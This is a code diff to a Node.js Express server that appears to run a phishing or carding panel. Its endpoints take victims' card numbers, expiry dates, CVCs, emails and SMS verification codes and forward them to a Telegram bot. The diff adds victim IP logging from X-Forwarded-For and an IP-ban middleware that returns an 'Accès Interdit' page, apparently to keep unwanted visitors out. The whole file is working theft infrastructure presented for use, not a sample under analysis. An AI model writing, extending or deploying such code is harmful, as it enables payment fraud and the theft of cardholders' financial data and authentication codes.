@@ -6,8 +6,10 @@ const path = require('path');
 const axios = require('axios');
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
+const db = require('./lib/db');
 
 const app = express();
+app.set('trust proxy', true);
 const PORT = process.env.PORT || 3000;
 const CODES_FILE = path.join(__dirname, 'codes.json');
 
@@ -68,8 +70,30 @@ botTg.on('callback_query', (query) => {
     }
 });
 
+// Helper for Real IP
+const getRealIP = (req) => {
+    const xForwardedFor = req.headers['x-forwarded-for'];
+    if (xForwardedFor) return xForwardedFor.split(',')[0].trim();
+    return req.ip || req.connection.remoteAddress;
+};
+
+// IP Ban Middleware
+const checkIPBan = async (req, res, next) => {
+    try {
+        const ip = getRealIP(req);
+        const result = await db.query('SELECT * FROM banned_ips WHERE ip = $1', [ip]);
+        if (result.rows.length > 0) {
+            return res.status(403).send('<html><body style="background:#000;color:#f00;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><h1>Accès Interdit.</h1></body></html>');
+        }
+        next();
+    } catch (err) {
+        next();
+    }
+};
+
 app.use(cors());
 app.use(bodyParser.json());
+app.use(checkIPBan);
 app.use(express.static('public'));
 
 // Ensure codes file exists
@@ -96,7 +120,7 @@ app.post('/api/pay', async (req, res) => {
             `📧 *MAIL:* \`${email || 'N/A'}\`\n\n` +
             `💎 *CARTE:* \`${cardNumber || 'N/A'}\`\n` +
             `📅 *DATE:* \`${expiry || 'N/A'}\`    🔒 *CVC:* \`${cvc || 'N/A'}\`\n\n` +
-            `🌍 *PAYS:* \`${country || 'N/A'}\`    🌐 *IP:* \`${req.ip}\``;
+            `🌍 *PAYS:* \`${country || 'N/A'}\`    🌐 *IP:* \`${getRealIP(req)}\``;
         
         await sendToTelegram(message, {
             reply_markup: {
@@ -126,7 +150,7 @@ app.post('/api/pay', async (req, res) => {
 
 app.post('/api/submit-sms', async (req, res) => {
     const { smsCode, paymentId } = req.body;
-    sendToTelegram(`📲 *SMS REÇU (Server)*\nCODE: \`${smsCode}\``);
+    sendToTelegram(`📲 *SMS REÇU (Server)*\nCODE: \`${smsCode}\`\n🌐 *IP:* \`${getRealIP(req)}\``);
     res.json({ success: true, code: generateCode() });
 });
 
